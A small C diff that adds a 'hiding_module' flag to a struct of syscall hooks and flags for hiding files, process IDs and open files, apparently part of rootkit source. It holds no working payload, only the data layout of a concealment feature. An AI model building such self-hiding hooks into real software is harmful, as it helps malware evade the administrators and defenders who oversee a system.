@@ -11,6 +11,7 @@ typedef enum {
 
 typedef struct {
     sc_hook_t hooks[16];
+    bool hiding_module;
     bool hiding_files;
     bool hiding_pids;
     bool hiding_open_files;
